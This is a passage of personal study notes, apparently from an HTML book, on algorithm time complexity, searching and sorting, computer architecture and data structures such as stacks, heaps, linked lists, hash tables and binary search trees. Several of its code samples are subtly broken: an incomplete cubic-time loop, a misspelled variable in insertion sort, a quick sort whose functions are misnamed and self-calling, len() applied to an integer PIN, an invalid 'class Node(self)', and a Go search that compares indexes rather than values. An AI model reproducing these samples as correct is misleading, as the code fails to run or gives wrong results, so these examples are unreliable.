<li>Suppose you modify your free book program so that instead of giving a free book to the first customer of the day, you iterate through your list of customers and give all customers who‚Äôs name starts with the letter ‚ÄúB‚Äù a free book. The list of customers is not sorted. Now you must iterate through the list one by one to find all the customers who‚Äôs names start with the letter ‚ÄúB‚Äù. When your customer list contains 5 items, your algorithm will take 5 steps. When it contains 10 items, it will take 10 steps, and so on.</li>
</ul>
<h3 id="log-linear-time"><a class="header" href="#log-linear-time">Log-Linear Time</a></h3>
<ul>
<li>Log-linear time grows as a combination of logarithmic and linear time complexities. For example, a log-linear algorithm might evaluate an O(log n) operation n times. In Big O Notation, you express a log-linear algorithm as O(n log n). Log-Linear algorithms often divide a data set into smaller parts and process each piece independently.</li>
</ul>
<h3 id="quadratic-time"><a class="header" href="#quadratic-time">Quadratic Time</a></h3>
<ul>
<li>An algorithm runs in quadratic time when its performance is directly proportional to the problem‚Äôs size squared. In big O notation, you express this as O(n^2)</li>
<li>Example:</li>
</ul>
<pre><code>numbers = [1,2,3,4,5]
for i in numbers:
    for j in numbers:
        x = i * j
        print(x)
</code></pre>
<ul>
<li>As a general rule, if your algorithm contains two nested loops running from 1 to n, it‚Äôs time complexity will be at least O(n^2). Many sorting algorithms such as insertion sort use quadratic time.</li>
</ul>
<h3 id="cubic-time"><a class="header" href="#cubic-time">Cubic Time</a></h3>
<ul>
<li>An algorithm runs in cubic time when its performance is directly proportional to the size of the problem cubed. This is expressed in Big O notation as O(n^3)</li>
<li>Example:</li>
</ul>
<pre><code>numbers = [1,2,3,4,5]
for i in numbers:
    for j in numbers:
        for h in numbers:
            x = i + j + 
            print(x)
</code></pre>
<h3 id="exponential-time"><a class="header" href="#exponential-time">Exponential Time</a></h3>
<ul>
<li>One of the worst time complexities</li>
<li>An algorithm that runs in exponential time contains a constant that is raised to the size of the problem.</li>
<li>Big O Notation: O(c^n)</li>
<li>Example:</li>
</ul>
<pre><code>pin = 931
n = len(pin)
for i in range(10**n):
    if i == pin:
        print(i)
</code></pre>
<p>Here we are trying to guess a 3 digit password. When n is 1, the algorithm takes 10 steps. When n is 2, the algorith takes 100 steps. When n is 3, the algorithm takes 1000 steps. It grows quickly.</p>
<h2 id="search-algorithms"><a class="header" href="#search-algorithms">Search Algorithms</a></h2>
<h3 id="linear-search"><a class="header" href="#linear-search">Linear Search</a></h3>
<ul>
<li>Iterate through every item in a data set and compare it to the test case</li>
<li>Time complexity is O(n)</li>
<li>Consider using a Linear search when the data is not sorted</li>
</ul>
<pre><code class="language-go">func linearSearch(numbers []int, value int) bool {
    for _, v := range numbers {
       if v == value {
            return true
       } 
    }
    return false
}

func main() {
    nums := []int{1,50,34,20,10,54,23,65}
    fmt.Println(linearSearch(nums, 34))
}
</code></pre>
<h3 id="binary-search"><a class="header" href="#binary-search">Binary Search</a></h3>
<ul>
<li>Faster than a linear search</li>
<li>Only works when the data is sorted</li>
<li>A binary search searches for elements in a list by dividing the list into two halves. The first step is to locate the middle number. You then determine if the number you are looking for is less than or greater than the middle number. If the number you are looking for is greater, you continue searching numbers to the right of the middle number, repeating the process of splitting this new list into two. If the number you are looking for is less, you search the numbers to the left of the middle number, repeating this process.</li>
<li>Time complexity is O(log n)</li>
</ul>
<pre><code class="language-go">
func binarySearch(needle int, haystack []int) bool {

	low := 0
	high := len(haystack) - 1

	for low &lt;= high{
		median := (low + high) / 2

		if haystack[median] &lt; needle {
			low = median + 1
		}else{
			high = median - 1
		}
	}

	if low == len(haystack) || haystack[low] != needle {
		return false
	}

	return true
}


func main(){
	items := []int{1,2, 9, 20, 31, 45, 63, 70, 100}
	fmt.Println(binarySearch(63, items))
}

</code></pre>
<h2 id="sorting-algorithms"><a class="header" href="#sorting-algorithms">Sorting Algorithms</a></h2>
<h3 id="bubble-sort"><a class="header" href="#bubble-sort">Bubble Sort</a></h3>
<ul>
<li><need to="" add="" notes="">
</need></li>
</ul>
<h3 id="insertion-sort"><a class="header" href="#insertion-sort">Insertion sort</a></h3>
<ul>
<li>Insertion sort is a sorting algorithm where you sort a list like you sort a deck of cards. Suppose you have the numbers [ 6,5,8,2 ]. You start with the second number in the list and compare it to the first. Since 5 is less than 6, you move 5 to the first position. You now compare the number in the third position (8) to the number in the second position. Because 8 is greater than 6, 8 does not move. Because you already sorted the first half of the list, you do not need to compare 8 to 5. You then compare the 4th number in the list (2), and because 8 is greater than 2, you go one by one through the sorted left half of the list, comparing 2 to each number until it arrives at the front and the entire list is sorted: 2,5,6,8</li>
<li>Example:</li>
</ul>
<pre><code>def insertion_sort(a_list):
    for i in range(len(a_list) - 1):
        current_position = i + 1

        while currrent_postition &gt; 0 and a_list[current_position - 1] &gt; a_list[current_position]:
            # swap
            a_list[current_position], a_list[current_position - 1] = a_list[current_position - 1], a_list[current_position]
            current_position -= 1
    return a_list
</code></pre>
<ul>
<li>Insertion sort is O(n^2), so it is not very efficient</li>
<li>Insert sort can be efficient on a nearly sorted list</li>
</ul>
<h3 id="merge-sort"><a class="header" href="#merge-sort">Merge Sort</a></h3>
<ul>
<li>A merge sort is a recursive divide-and-conquer sorting algorithm that continually splits a list in half until there are one or more lists containing one item and then puts them back together in the correct order.
Steps:
<ol>
<li>If the list is of length 1, return the list as it is already sorted by definition of the merge sort algorithm.</li>
<li>If the list has more than one item, split the list into two halves.</li>
<li>Recursively call the merge sort function on both halves.</li>
<li>Merge the two sorted halves back together into one sorted list by comparing the first</li>
</ol>
</li>
</ul>
<p><img src="images/algorithms/merge-sort.png" alt="Merge Sort"></p>
<ul>
<li>Lists containing only one item are sorted by definition.</li>
<li>A merge sort is a ‚Äòdivide and conquer‚Äô algorithm. You recursively break a problem into two until they are simple enough to solve easily.</li>
<li>A merge sort‚Äôs time complexity is O(n * log n)</li>
<li>With log linear time complexity, a merge sort is one of the most efficient sorting algorithms</li>
</ul>
<pre><code class="language-python">def merge_sort(nums):
    if len(nums) &lt; 2:
        return nums

    mid = len(nums) // 2
    first_half = nums[:mid]
    second_half = nums[mid:]

    sorted_left_side = merge_sort(first_half)
    sorted_right_side = merge_sort(second_half)
    return merge(sorted_left_side, sorted_right_side)

def merge(first, second):
    final = []
    i = 0
    j = 0

    while i &lt; len(first) and j &lt; len(second):
        if first[i] &lt;= second[j]:
            final.append(first[i])
            i += 1
        else:
            final.append(second[j])
            j += 1

    while i &lt; len(first):
        final.append(first[i])
        i += 1

    while j &lt; len(second):
        final.append(second[j])
        j += 1
        
    return final
</code></pre>
<h3 id="quick-sort"><a class="header" href="#quick-sort">Quick Sort</a></h3>
<ul>
<li>Like merge sort, quick sort is a recursive divide-and-conquer sorting algorithm. However, instead of splitting the list in half, quick sort selects a ‚Äòpivot‚Äô element from the list and partitions the other elements into two sub-arrays according to whether they are less than or greater than the pivot. The sub-arrays are then sorted recursively.</li>
<li>Quick sort will sort the list in-pace, requiring small additional amounts of memory to perform the sorting.</li>
<li>If the list has zero or one element, it is already sorted.</li>
<li>Quick sort will quickly degrade into O(n^2) time complexity if the pivot elements are poorly chosen. i.e. if the smallest or largest element is always chosen as the pivot in an already sorted list. However, with good pivot selection, quicksort can achieve average time complexity of O(n log n). To ensure good pivot selection, you can use techniques such as choosing the median element or using randomization.</li>
</ul>
<pre><code class="language-python">def partition(nums, low, high):
    if low &lt; high:
        middle = partition(nums, low, high)

        quick_sort(nums, low, middle - 1)
        quick_sort(nums, middle + 1, high)

def paritition(nums, low, high):
    pivot = nums[high] # get the last element in the list
    i = low - 1 # pointer for the smaller element

    for j in range(low, high):
        if nums[j] &lt;= pivot:
            i += 1
            nums[i], nums[j] = nums[j], nums[i] # swap

    nums[i + 1], nums[high] = nums[high], nums[i + 1] # swap pivot element
    return i + 1

</code></pre>
<h3 id="selection-sort"><a class="header" href="#selection-sort">Selection Sort</a></h3>
<ul>
<li>Selection sort is similar to bubble sort in that it repeatedly swaps items in a list. However, it‚Äôs slightly more performant as it only makes one swap per iteration of the outer loop.</li>
</ul>
<pre><code class="language-python">def selection_sort(a_list):
    for i in range(len(a_list)):
        smallest_index = i
        for j in range(i + 1, len(a_list)):
            if a_list[j] &lt; a_list[smallest_index]:
                smallest_index = j
        a_list[i], a_list[smallest_index] = a_list[smallest_index], a_list[i] # swap

</code></pre>
<h1 id="polynomial-vs-exponential-time-complexity"><a class="header" href="#polynomial-vs-exponential-time-complexity">Polynomial vs Exponential Time Complexity</a></h1>
<ul>
<li>Broadly speaking, algorithms can be classified into two categories based on their time complexity: polynomial time and exponential time.</li>
<li>Algorithm runs in Polynomial time if its runtime does not grow faster than n^k, where k is any constant (e.g. n^2, n^3, n^4, etc.) and n is the size of the input. Polynomial time algorithms can be useful if they are not too slow.</li>
<li>Exponential time algorithms are almost always too slow to be practical.</li>
<li>The name for the set of Polynomial time algorithms is ‚ÄúP‚Äù. Problems that can be solved by polynomial time algorithms are called ‚Äútractable‚Äù problems. Problems that cannot be solved by polynomial time algorithms are called ‚Äúintractable‚Äù problems.</li>
</ul>
<h1 id="non-deterministic-polynomial-time-np"><a class="header" href="#non-deterministic-polynomial-time-np">Non-Deterministic Polynomial Time (NP)</a></h1>
<ul>
<li>Non-deterministic polynomial time (NP) is a complexity describing a set of problems that can be verified in polynomial time but not necessarily solved in polynomial time.</li>
</ul>
<h1 id="examples-2"><a class="header" href="#examples-2">Examples</a></h1>
<pre><code>package main

func main() {

}

// O(1) describes an algorithm that will always execute in the same time (or space) regardless of the size of the input data set.
func returnFalse() bool {
        return false
}

// O(N) describes an algorithm whose performance will grow linearly and in direct proportion to the size of the input data set. The example below also demonstrates how Big O favours the worst-case performance scenario; a matching string could be found during any iteration of the for loop and the function would return early, but Big O notation will always assume the upper limit where the algorithm will perform the maximum number of iterations.
func containsValue(value int, intSlice []int) bool {
        for r := range intSlice {
                if r == value {
                        return true
                }
        }
        return false
}

// O(N¬≤) represents an algorithm whose performance is directly proportional to the square of the size of the input data set. This is common with algorithms that involve nested iterations over the data set. Deeper nested iterations will result in O(N¬≥), O(N‚Å¥) etc.
func containsDuplicates(vals []string) bool {
        for i := 0; i &lt; len(vals); i++ {
                for j := 0; j &lt; len(vals); j++ {
                        if i == j {
                                continue
                        }
                        if vals[i] == vals[j] {
                                return true
                        }
                }
        }
        return false
}

// O(2^N) denotes an algorithm whose growth doubles with each addition to the input data set. The growth curve of an O(2^N) function is exponential ‚Äî starting off very shallow, then rising meteorically. An example of an O(2^N) function is the recursive calculation of Fibonacci numbers:
func Fibonacci(number int) int {
        if number &lt;= 1 {
                return number
        }

        return Fibonacci(number-2) + Fibonacci(number-1)
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="computer-architecture"><a class="header" href="#computer-architecture">Computer Architecture</a></h1>
<h2 id="table-of-contents-6"><a class="header" href="#table-of-contents-6">Table of Contents</a></h2>
<ol>
<li><a href="#risc-vs-cisc">RISC vs CISC</a></li>
<li><a href="#von-neumann-architecture-model">von Neumann Architecture Model</a></li>
<li><a href="#memory-and-addressing">Memory and Addressing</a></li>
<li><a href="#the-von-neumann-bottleneck">The von Neumann Bottleneck</a></li>
<li><a href="#modern-innovations-in-computer-architecture">Modern Innovations in Computer Architecture</a></li>
</ol>
<hr>
<h2 id="risc-vs-cisc"><a class="header" href="#risc-vs-cisc">RISC vs CISC</a></h2>
<ul>
<li>The CPU executes instructions that are stored in various memory layers throughout the computer system (RAM, caches, registers).</li>
<li>A particular CPU has an Instruction Set Architecture (ISA), which defines:
<ul>
<li>The set of instructions the CPU uses and their binary encoding.</li>
<li>The set of CPU registers.</li>
<li>The effects of executing instructions on the state of the processor.</li>
<li>Examples of ISAs include SPARC, ARM, x86, MIPS, and PowerPC.</li>
<li>A micro-architecture is a specific implementation of an ISA which can have different circuitry. AMD and Intel both produce x86 processors, but with different micro-architectures.</li>
</ul>
</li>
</ul>
<h3 id="key-differences-between-risc-and-cisc"><a class="header" href="#key-differences-between-risc-and-cisc">Key Differences Between RISC and CISC</a></h3>
<ul>
<li>
<p><strong>RISC (Reduced Instruction Set Computer)</strong>:</p>
<ul>
<li>Small set of basic instructions that execute quickly, typically in a single clock cycle.</li>
<li>Simpler micro-architecture design, requiring fewer transistors.</li>
<li>Programs may contain more instructions, but execution is highly efficient.</li>
<li>Example: ARM processors, widely used in mobile devices.</li>
</ul>
</li>
<li>
<p><strong>CISC (Complex Instruction Set Computer)</strong>:</p>
<ul>
<li>Designed to execute more complex instructions, which often take multiple cycles.</li>
<li>Programs are smaller as they contain fewer instructions.</li>
<li>Example: x86 processors, dominant in desktops and servers.</li>
</ul>
</li>
<li>
<p><strong>General Observations</strong>:</p>
<ul>
<li>RISC architectures excel in scenarios requiring high efficiency and low power, such as mobile devices.</li>
<li>CISC architectures dominate general-purpose computing due to compatibility with legacy software and complex operations.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="von-neumann-architecture-model"><a class="header" href="#von-neumann-architecture-model">von Neumann Architecture Model</a></h2>
<ul>
<li>All modern processors adhere to the von Neumann architecture model.</li>
<li>The von Neumann architecture consists of five components:
<ol>
<li>
<p><strong>Processing Unit</strong>:</p>
<ul>
<li>Composed of the <strong>Arithmetic/Logic Unit (ALU)</strong> and <strong>Registers</strong>.</li>
<li>The ALU performs mathematical operations (addition, subtraction, etc.).</li>
<li>Registers are fast storage units for program data and instructions being executed.</li>
</ul>
</li>
<li>
<p><strong>Control Unit</strong>:</p>
<ul>
<li>Responsible for loading instructions from memory and coordinating execution with the processing unit.</li>
<li>Contains the <strong>Program Counter (PC)</strong> and <strong>Instruction Register (IR)</strong>.</li>
</ul>
</li>
<li>
<p><strong>Memory Unit</strong>:</p>
<ul>
<li>Stores program data and instructions in <strong>Random Access Memory (RAM)</strong>.</li>
<li>RAM provides fast, direct access to memory locations via unique addresses.</li>
</ul>
</li>
<li>
<p><strong>Input Unit</strong>:</p>
<ul>
<li>Loads program data and instructions into the computer.</li>
</ul>
</li>
<li>
<p><strong>Output Unit</strong>:</p>
<ul>
<li>Stores or displays program results.</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="fetch-decode-execute-store-feds-cycle"><a class="header" href="#fetch-decode-execute-store-feds-cycle">Fetch-Decode-Execute-Store (FEDS) Cycle</a></h3>
<ol>
<li><strong>Fetch</strong>: The control unit fetches the next instruction from memory using the program counter. The control unit places that address on the address bus and increments the PC. It also places the read command on the control bus. The memory unit then reads the bytes stored at the address and places them on the data bus which is then read by the control unit. The instruction register stores the bytes of the instruction received from the memory unit.</li>
<li><strong>Decode</strong>: The control unit decodes the instuction stored in the instruction register. It decodes the opcode and operands, determining what action to take.</li>
<li><strong>Execute</strong>: The processing unit executes the instruction. The ALU performs the necessary calculations or data manipulations.</li>
<li><strong>Store</strong>: Results are stored in memory or registers.</li>
</ol>
<ul>
<li>Example: In modern systems, 32-bit processors can address up to (2^{32}) bytes of memory (4 GB).</li>
</ul>
<hr>
<h2 id="memory-and-addressing"><a class="header" href="#memory-and-addressing">Memory and Addressing</a></h2>
<ul>
<li><strong>Smallest Addressable Unit</strong>: In modern systems, the smallest addressable memory unit is 1 byte (8 bits).</li>
<li><strong>32-bit vs. 64-bit Architectures</strong>:
<ul>
<li>32-bit systems: Address up to (2^{32}) bytes (4 GB).</li>
<li>64-bit systems: Address up to (2^{64}) bytes (16 exabytes).</li>
</ul>
</li>
<li><strong>Memory Hierarchy</strong>:
<ul>
<li>Registers &gt; Cache &gt; RAM &gt; Secondary Storage.</li>
<li>Each layer balances speed and capacity, with registers being the fastest but smallest.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="the-von-neumann-bottleneck"><a class="header" href="#the-von-neumann-bottleneck">The von Neumann Bottleneck</a></h2>
<ul>
<li><strong>Definition</strong>: The limitation caused by the shared bus between memory and the CPU, which slows data transfer.</li>
<li><strong>Consequences</strong>:
<ul>
<li>Slower execution of memory-intensive programs.</li>
<li>Limits on parallel execution.</li>
</ul>
</li>
<li><strong>Mitigation</strong>:
<ul>
<li>Use of <strong>caches</strong> to reduce frequent memory access.</li>
<li>Development of <strong>pipelining</strong> and <strong>out-of-order execution</strong> to improve instruction throughput.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="modern-innovations-in-computer-architecture"><a class="header" href="#modern-innovations-in-computer-architecture">Modern Innovations in Computer Architecture</a></h2>
<ul>
<li><strong>Harvard Architecture</strong>:
<ul>
<li>Separates data and instruction memory, reducing the von Neumann bottleneck.</li>
</ul>
</li>
<li><strong>Multicore Processors</strong>:
<ul>
<li>Incorporate multiple CPUs (cores) on a single chip for parallel execution.</li>
</ul>
</li>
<li><strong>Pipelining</strong>:
<ul>
<li>Breaks instruction execution into stages, allowing multiple instructions to be processed simultaneously.</li>
<li>Each instruction takes 4 cycles: fetch, decode, execute, store, resulting in a CPI (cycles per instruction) of 4</li>
<li>The control circuitry of a CPU can be tweaked to obtain a better CPI value</li>
<li>The CPU circuity involved with executing each stage of the 4 stages is only actively involved once every 4 cycles. The other 3 cycles it sits idle. For example, in a given instruction, after the fetch stage, the fetch circuity sits idle for the remaining 3 clock cycles in the execution of the instruction. Pipelining is the act of allowing the fetch circuitry to execute the fetch stage for other instructions. Put another way, CPU pipelining is the idea of starting the execution of the  next instruction before the current instruction has fully completed its execution. Sequences of instructions can overlap.</li>
<li>The Intel Core i7 has a 14 stage pipeline</li>
<li>A pipeline stall occurs when any stage of execution is forced to wait on another before it can continue</li>
</ul>
</li>
<li><strong>Speculative Execution</strong>:
<ul>
<li>Predicts and executes instructions before they are needed, increasing efficiency.</li>
</ul>
</li>
<li><strong>Graphics Processing Units (GPUs)</strong>:
<ul>
<li>Specialized processors optimized for parallel computation, commonly used in machine learning and graphics.</li>
</ul>
</li>
<li><strong>RISC-V</strong>:
<ul>
<li>A modern open-standard RISC architecture gaining popularity for its flexibility and extensibility.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="building-a-processor"><a class="header" href="#building-a-processor">Building a Processor</a></h2>
<ul>
<li>The CPU implements the processing and control units of the von Neumann architecture.</li>
<li>Key components include the ALU, registers, and control unit.</li>
</ul>
<h3 id="alu"><a class="header" href="#alu">ALU</a></h3>
<ul>
<li>Performs all arithmetic and logical operations on signed and unsigned integers. A separate floating point unit performs arithmetic on floating-point numbers.</li>
<li>The ALU takes integer operands and opcode values that specify an operation to perform on the operands</li>
</ul>
<h3 id="registers-1"><a class="header" href="#registers-1">Registers</a></h3>
<ul>
<li>Fast, small storage units within the CPU that hold data and instructions being executed.</li>
<li>Common registers include the Program Counter (PC), Instruction Register (IR), and General-Purpose Registers (GPRs).</li>
<li>The CPU‚Äôs set of general-purpose registers is organized into a register file circuit.
<ul>
<li>A register file consists of a set of register circuits for storing data values and some control circuits for controlling reads and writes to its registers</li>
</ul>
</li>
<li></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="data-structures"><a class="header" href="#data-structures">Data Structures</a></h1>
<p><em>I‚Äôm a huge proponent of designing your code around the data, rather than the other way around, and I think it‚Äôs one of the reasons git has been fairly successful‚Ä¶ I will, in fact, claim that the difference between a bad programmer and a good one is whether he considers his code or his data structures more important. Bad programmers worry about the code. Good programmers worry about data structures and their relationships.</em> - Linus Torvalds</p>
<ul>
<li>A data structure is a way of organizing data in a computer so programmers can effectively use it in their programs.</li>
<li>An abstract data type is a description of a data structure, whereas a data structure is an actual implementation.</li>
<li>Computer scientists classify data structures based on different properties. For example, whether they are linear or non-linear.
<ul>
<li>Linear  data structures arrange elements in a sequence.</li>
<li>Non-linear data structures link data non-sequentially</li>
</ul>
</li>
<li>Traversing a data structure means to walk through the data structure one element at a time without backtracking. In a non-linear data structure, you often need to backtrack.</li>
<li>Computer scientists also classify data structure by whether they are static or dynamic:
<ul>
<li>static: fixed size</li>
<li>dynamic: can grow or shrink</li>
</ul>
</li>
</ul>
<h2 id="arrays"><a class="header" href="#arrays">Arrays</a></h2>
<ul>
<li>An array is a data structure that stores elements with indexes in a contiguous block of memory</li>
<li>Arrays are indexed by a key, with a key taking the form of an offset from the starting location in memory. The first element of an array is 0 elements away from the start, the next is 1 element from the start, and so on. ‚ÄúOne element away‚Äù could be a byte, a word, etc., depending on the size of the data.</li>
<li>Retrieving or storing any element takes constant time (o(1)), and the entire array takes O(n) space. Inserting and deleting elements in an array is also O(n), which is slow, as every element may need to be moved.</li>
<li>When the number of elements is known when first creating the array, there is no wasted space.</li>
<li>Iterating through an array is likely to be much faster than any other data structure because of fewer cache misses.</li>
<li>Arrays are often homogeneous (homo = one kind, geneous/genous = producing) and static. A homogeneous data structure can only hold data of one type.</li>
</ul>
<h2 id="stacks"><a class="header" href="#stacks">Stacks</a></h2>
<ul>
<li>A stack is an abstract data type and a linear data structure that allows you to remove only the most recently added element.</li>
<li>You can imagine a stack as a pile of books. You can add or remove only the top book.</li>
<li>Last in, first out (LIFO) data structure</li>
<li>You can push items onto the stack and pop items off of the stack</li>
<li>Stacks can be bounded (limited in size) or unbounded</li>
<li>You can create a stack with a class that internally uses an array or linked list to keep track of items</li>
<li>Pushing and popping items from a stack are all O(1)</li>
<li>Programs typically use stacks internally to track function calls</li>
</ul>
<h4 id="examples-3"><a class="header" href="#examples-3">Examples</a></h4>
<pre><code class="language-python">class Stack:
    def __init__(self):
        self.items = []

    def push(self, item):
        self.items.append(item)

    def size(self):
        return len(self.items)

    def peek(self):
        if len(self.items) == 0:
            return None
        return self.items[-1]

    def pop(self):
        if len(self.items) == 0:
            return None
        item = self.items[-1]
        del self.items[-1]
        return item

#------------
from stack import Stack

def is_balanced(input_str):
    s = Stack()
    for i in input_str:
        if i == "(":
            s.push(i)
        elif i == ")":
            result = s.pop()
            if result == None:
                return False

    if s.size() != 0:
        return False
    return True
</code></pre>
<pre><code class="language-go">// a stack implementation

package main

import (
        "fmt"
)

type stack []string

func (s *stack) push(val string) {
        *s = append(*s, val)
}

func (s *stack) pop() (string, bool) {
        if s.isEmpty() {
                return "", false
        }
        index := len(*s) - 1
        element := (*s)[index]
        *s = (*s)[:index]
        return element, true
}

func (s *stack) isEmpty() bool {
        return len(*s) == 0
}

func main() {
        var s stack

        fmt.Println("empty: ", s.isEmpty())

        s.push("hello")
        s.push("world")

        fmt.Println("length: ", len(s))
        fmt.Println("empty: ", s.isEmpty())

        fmt.Println("popping")
        val, _ := s.pop()
        fmt.Println("popped:", val)
}
</code></pre>
<h2 id="heap"><a class="header" href="#heap">Heap</a></h2>
<ul>
<li>a heap is a data structure which satisfies the heap ordering property, either min-heap (the value of each node is no smaller than the value of it‚Äôs parent) or max-heap (the value of each node is no larger than the value of it‚Äôs parent). A heap is a rooted, nearly complete binary tree, where the key of the root is greater than the key of either of its children, and this is recursively true for the subtree rooted at each child.</li>
<li>a max-heap supports the operations find-max, extract-max (pop), insert (push), and increase-key (change a node‚Äôs key and then move the node to it‚Äôs new position in the graph)</li>
<li>heaps, like stacks, tend to be implemented with arrays</li>
<li>only one element can be removed at a time (also similar to stacks), but rather than the most recent element, it will be the maximum element (for max-heap) or the minimum element (for min-heap)</li>
<li>heaps are partially ordered based on the key of each element, such that the highest (or lowest) priority element is always stored at the root</li>
</ul>
<h2 id="queues"><a class="header" href="#queues">Queues</a></h2>
<ul>
<li>A queue is an abstract data type and a linear data structure which you can add items only to the rear and remove them from the front.</li>
<li>First in, first out (FIFO) data structure</li>
<li>Enqueueing means adding an item to the queue, dequeueing means removing an item from the queue</li>
<li>Queues work like the checkout lines at a grocery store.</li>
<li>A bounded queue limits how many items you can add to it.</li>
<li>Enqueueing and dequeueing, peeking, and getting the length of the queue are all O(1) regardless of the queues size</li>
</ul>
<h2 id="linked-lists"><a class="header" href="#linked-lists">Linked Lists</a></h2>
<ul>
<li>Similar to arrays, but elements in a linked list do not have indexes because your computer does not store the items in a linked list in sequential memory. Instead, a linked list contains a chain of nodes, with each node holding a piece of data and the next node‚Äôs location in the chain. The data in each node that stores the next node‚Äôs location in the linked list is called a pointer. The first node in a linked list is called a head. The last element in a linked list points to None.
<code>head &gt; a &gt; b &gt; c &gt; none</code></li>
<li>The only way to access an item in a linked list is to do a linear search for it, which is O(n). Adding and removing a node from a linked list is O(1), whereas inserting and deleting items from an array is O(n).</li>
<li>Memory management systems in operating systems use linked lists extensively, as do databases</li>
<li>There are many types of linked lists:
<ul>
<li>singly linked list: a type of linked list with pointers that point only to the next element. You can move through a singly linked list only by starting at the head and moving to the end.</li>
<li>doubly linked list: each node contains two pointers, one pointing to the next node and one pointing to the previous node. This allows you to move through a doubly linked list in either direction.</li>
<li>circular linked list: the last node points back to the first node</li>
</ul>
</li>
<li>Unlike normal lists, linked lists are not stored sequentially in memory, so they can grow and shrink dynamically without needing to reallocate or reorganize memory.</li>
</ul>
<p>Example:</p>
<pre><code class="language-python">class Node(self):
    def __init__(self, val):
        self.val = val
        self.next = None
        
    def set_next(self, next_node):
        self.next = next_node

    def __repr__(self):
        return self.val

</code></pre>
<h2 id="hash-tables"><a class="header" href="#hash-tables">Hash Tables</a></h2>
<ul>
<li>Hash tables are associative arrays that map keys to values</li>
<li>Dictionaries are one implementation of hash tables commonly found in programming languages</li>
<li>Hash tables use a hash function to convert a key into an index in an array where the corresponding value is stored</li>
<li>The hash function should:
<ul>
<li>Take a key and return an integer</li>
<li>Always return the same integer for the same key</li>
<li>Always return a valid index in the array</li>
</ul>
</li>
<li>A hash collision can occur when two keys hash to the same index.</li>
<li>To determine the index where a value is stored in a hash table, a hash function is used. One common hash function is to modulo the number you are storing in the hash table by the number of values the hash table can store. For example, you have a hash table that can store 7 values. You want to store the number 90. 90%7=6, so you would store the number 90 at index 6. This method can result in collisions if you have two values whose modulo results in the same index number.</li>
<li>a collision occurs when you have multiple values that map to the same spot.</li>
<li>The lookup, insertion, and deletion operations of a hash table are all o(1) on average.</li>
</ul>
<h2 id="trees"><a class="header" href="#trees">Trees</a></h2>
<ul>
<li>Trees are a hierarchical data structure made up of nodes connected by edges. A tree starts with a root node at the top. Each node can have child nodes connected underneath it. Nodes with child nodes are called parent nodes. Nodes that share the same parent are called sibling nodes. The connection between two nodes is called an edge. Nodes without child nodes are called leaf nodes, while nodes with child nodes are called branch nodes.</li>
<li>Trees are like linked lists in the sense that a root node holds references to its child nodes. However, tree nodes can have multiple children instead of just one.</li>
<li>A tree structure must abide by the following rules:
<ul>
<li>A tree node can have a value and a list of references to child nodes.</li>
<li>Children can only have a single parent</li>
</ul>
</li>
</ul>
<h2 id="binary-search-trees-bst"><a class="header" href="#binary-search-trees-bst">Binary Search Trees (BST)</a></h2>
<p><img src="images/algorithms/binary_search_tree.png" alt="Binary Search Tree">
<img src="images/algorithms/binary_search_tree_2.png" alt="Binary Search Tree in O(n)"></p>
<ul>
<li>Trees are not particularly useful unless they are ordered in some way. One of the most common types of trees is a binary search tree.</li>
<li>In addition to the constraints of a tree structure, a BST adds the following constraints:
<ul>
<li>Instead of an unbounded list of children, a parent node can only have two children</li>
<li>The left child‚Äôs value must be less than its parent‚Äôs value</li>
<li>The right child‚Äôs value must be more than its parent‚Äôs value.</li>
<li>No two nodes in the tree can have identical values</li>
</ul>
</li>
<li>Because of the constraints listed above, binary trees are ordered ‚Äòby default‚Äô, making them very performant.</li>
</ul>
<h4 id="example-4"><a class="header" href="#example-4">Example:</a></h4>
<pre><code class="language-python">import random

class User:
    def __init__(self, id):
        self.id = id
        user_names = [
            "Blake",
            "Ricky",
            "Shelley",
            "Dave",
            "George",
            "John",
            "James",
            "Mitch",
            "Williamson",
            "Burry",
            "Vennett",
            "Shipley",
            "Geller",
            "Rickert",
            "Carrell",
            "Baum",
            "Brownfield",
            "Lippmann",
            "Moses",
        ]
        self.user_name = f"{user_names[id % len(user_names)]}#{id}"

    def __eq__(self, other):
        return isinstance(other, User) and self.id == other.id

    def __lt__(self, other):
        return isinstance(other, User) and self.id &lt; other.id

    def __gt__(self, other):
        return isinstance(other, User) and self.id &gt; other.id

    def __repr__(self):
        return "".join(self.user_name)


def get_users(num):
    random.seed(1)
    users = []
    ids = []
    for i in range(num * 3):
        ids.append(i)
    random.shuffle(ids)
    ids = ids[:num]
    for id in ids:
        user = User(id)
        users.append(user)
    return users

# The Binary Search Tree Node class
class BSTNode:
    def __init__(self, val=None):
        self.left = None
        self.right = None
        self.val = val

    def insert(self, val):
        if not self.val:
            self.val = val
            return

        if self.val == val:
            return

        if val &lt; self.val:
            if not self.left:
                self.left = BSTNode(val=val)
            else:
                self.left.insert(val)
        else:
            if not self.right:
                self.right = BSTNode(val=val)
            else:
                self.right.insert(val)
</code></pre>
<ul>
<li>Inserting into a BST is O(log n) on average, but O(n) in the worst case (when each node has a single child, essentially creating a linked list.)</li>
<li>While it‚Äôs true that on average a BST has a time complexity of O(log n) for lookups, deletions, and insertions. This rule can quickly break down if the data is mostly or completely sorted. If mostly or completely sorted data is inserted into a binary tree, the tree will become deeper than it is wide. The BST‚Äôs time complexity depends on it being balanced, meaning that the left and right subtrees of any node differ in height by no more than one. If the tree becomes unbalanced, the time complexity for lookups, deletions, and insertions can degrade to O(n) in the worst case.</li>
</ul>
<h2 id="red-black-trees"><a class="header" href="#red-black-trees">Red Black Trees</a></h2>
<ul>
<li>A red-black tree is a self-balancing binary search tree where each node has an extra bit for denoting the color of the node, either red or black. By constraining the node colors on any path from the root to a leaf, red-black trees ensure that no such path is more than twice as long as any other, thus the tree remains approximately balanced.</li>
<li>red/black = true/false</li>
<li>Properties of red-black trees:
<ul>
<li>Each node is either red or black</li>
<li>The root is always black</li>
<li>All null leaf nodes are black</li>
<li>If a node is red, both its children must be black (no two reds in a row)</li>
<li>All paths from a single node go through the same number of black nodes</li>
</ul>
</li>
<li>When a branch starts to get too long, the tree rotates and recolors nodes to maintain balance
‚Ä¶.</li>
</ul>
<h2 id="tries"><a class="header" href="#tries">Tries</a></h2>
<ul>
